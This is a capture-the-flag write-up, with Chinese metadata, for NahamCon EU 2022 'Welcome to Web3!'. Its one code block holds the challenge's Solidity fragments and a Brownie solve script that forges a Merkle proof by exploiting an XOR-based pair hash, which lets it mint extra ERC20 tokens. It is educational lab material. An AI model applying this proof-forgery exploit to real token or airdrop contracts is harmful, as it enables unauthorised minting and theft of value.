---
title: NahamCon EU CTF 2022 – Welcome to Web3! (Airdrop.sol Merkle proof)
contest: NahamCon EU
year: 2022
difficulty: hard
vuln_type: web_unknown
tags:
- Web3
- Airdrop.sol
- Merkle proof
- 4 元素 proof
- Brownie 部署
- ERC20 mint
attack_chain: '|'
key_payload: '|'
one_liner: 'NahamCon EU CTF 2022 Welcome to Web3!: Airdrop.sol 4 元素 Merkle proof 验证, 改 proof[0]=account.address, 凑 proof[1] 让 pairHash 等于 merkleRoot。'
lesson: '|'
quality: high
full_path: NahamCon_EU_CTF_2022_–_Welcome_to_Web3!.full.md
meta_path: NahamCon_EU_CTF_2022_–_Welcome_to_Web3!.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'NahamCon EU CTF 2022 – Welcome to Web3! (Airdrop.sol Merkle proof)。NahamCon EU CTF 2022 Welcome to Web3!: Airdrop.sol 4 元素 Merkle proof 验证, 改 proof[0]=account.address, 凑 proof[1] 让 pairHash 等于 merk...'
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/85511.html
reasoning_chain:
- 触发点：SimpleToken (ERC20) + Airdrop 合约 + mintToken(merkleProof) → 假设：验证 msg.sender + 4 元素 proof + merkleRoot
- 动作：mintToken 验证逻辑：require(msg.sender == merkleProof[0]) + require(proof.length == 4) + require(proofHash == merkleRoot)
- 假设：mint 函数 require(msg.sender == airdropAddress) + _mint(addr, amount) → 攻击：让 totalSupply 从 100000 涨到 200000
- pairHash(a, b) = keccak256(abi.encode(a ^ b)) → proofHash = pairHash(pairHash(pairHash(a, b), c), d) → 假设：Merkle proof 是 XOR 折叠
- 假设：给定 _merkleRoot + 4 元素 proof + msg.sender → 改 proof[0] = account.address → 改 proof[1] 让 pairHash 还原
- 动作：新 pair = pairHash(prev) ⊕ target_root 凑成 proof[1] → 假设：凑出使 proofHash = merkleRoot 的 proof[1]
- 假设：mintToken 让 airdropAddress 调 mint 触发 _mint → totalSupply 增加 → 完成
failed_attempts:
- 试图直接调 mint(addr, amount) → 失败：require(msg.sender == airdropAddress) 阻断普通用户
- 试图不改 proof 直接用原始 msg.sender → 失败：require(msg.sender == merkleProof[0]) 要求 proof[0] == msg.sender
- 试图遍历 proof 所有 4 个元素 → 失败：必须改 proof[0] 和 proof[1] 让 XOR 折叠 = merkleRoot
key_observations:
- pairHash(a, b) = keccak256(abi.encode(a ^ b)) 是非标准 Merkle 折叠（标准是 sortedPair + keccak256(abi.encodePacked(a, b))）
- Merkle proof 改 proof[0] 凑 msg.sender + 改 proof[1] 凑 XOR 折叠 = merkleRoot 是 XOR pair 攻击
- mint 函数的 airdropAddress 限制 = 部署合约时设定，可通过 mintToken 触发
- _mint(addr, amount) 增加 totalSupply 是 ERC20 标准增发接口
- Brownie/Hardhat 部署 + Web3 调用是 Web3 题标配工具链
prerequisites:
- Solidity Merkle proof 实现（pairHash + proofHash）
- ERC20 _mint / totalSupply 增发逻辑
- Web3.py / Brownie / Hardhat 调用合约
- keccak256 + abi.encode 编码
---
# NahamCon EU CTF 2022 – Welcome to Web3!

> 原文: https://www.ctfiot.com/85511.html
> ID: 85511


```
def solved():
 token = SimpleToken[-1]

 # You should mint 100000 amount of token.
 if token.totalSupply() == 200000:
 return True, "Solved!"
 else:
 return False, "Not solved, you need to mint enough to solve."
def deploy():
 ADMIN = accounts[9]
 token = SimpleToken.deploy('Simple Token', 'STK', {'from': ADMIN})
 _merkleRoot = 0x654ef3fa251b95a8730ce8e43f44d6a32c8f045371ce6a18792ca64f1e148f8c
 airdrop = Airdrop.deploy(token, 1e5, _merkleRoot, 4, {'from': ADMIN})
 token.setAirdropAddress(airdrop, {'from': ADMIN})

 merkleProof = [
 int(convert.to_bytes(ADMIN.address).hex(),16),
 0x000000000000000000000000feb7377168914e8771f320d573a94f80ef953782,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]

 airdrop.mintToken(merkleProof)
function mint(address addr, uint256 amount) external{
 require(msg.sender == airdropAddress, "You can't call this");
 _mint(addr, amount);
 }
function mintToken(bytes32[] memory merkleProof) external {
 require(!dropped[msg.sender], "Already dropped");
 require(merkleProof.length == proofLength, "Tree length mismatch");
 require(address(uint160(uint256(merkleProof[0]))) == msg.sender, "First Merkle leaf should be the msg.sender's address");
 require(proofHash(merkleProof) == merkleRoot, "Merkle proof failed");

 dropped[msg.sender] = true;
 token.mint(msg.sender, dropPerAddress);
 _latestAcceptedProof = merkleProof;
 }
merkleProof = [
 int(convert.to_bytes(ADMIN.address).hex(),16),
 0x000000000000000000000000feb7377168914e8771f320d573a94f80ef953782,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]
from brownie import Airdrop, accounts, Wei, convert

def test_solve():
	# Set the deployed contract address
 contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
 # Get the first local account to be out account for testing
 account = accounts[0]

	# Print some variables to stdout
 print(f"[+] Contract: {contract}")
 print(f"[+] Account: {account}")
 print(f"[+] Admin Account: {accounts[9]}")

	# Calculate the first argument of our array
 merkleProof = [
 convert.to_bytes(account.address).hex()
 ]

	#Print it
 print(merkleProof)
function proofHash(bytes32[] memory nodes) internal pure returns (bytes32 result) {
 result = pairHash(nodes[0], nodes[1]);
 for (uint256 i = 2; i < nodes.length; i++) {
 result = pairHash(result, nodes[i]);
 }
 }
function pairHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
 return keccak256(abi.encode(a ^ b));
 }
merkleProof = [
 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266, # Our testing account
 0x000000000000000000000000adc69b805f1aba6eb34c04277eae5760308b82c4, # New element calculated
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]
from brownie import Airdrop, accounts, Wei, convert

def test_solve():
 contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
 account = accounts[0]

 print(f"[+] Contract: {contract}")
 print(f"[+] Account: {account}")
 print(f"[+] Admin Account: {accounts[9]}")

 merkleProof = [
 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266,
 0x000000000000000000000000adc69b805f1aba6eb34c04277eae5760308b82c4,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]

 contract.mintToken(merkleProof, {"from": account})

 print(f"\n[+] Last accepted proof: {contract.latestAcceptedProof()}")
```
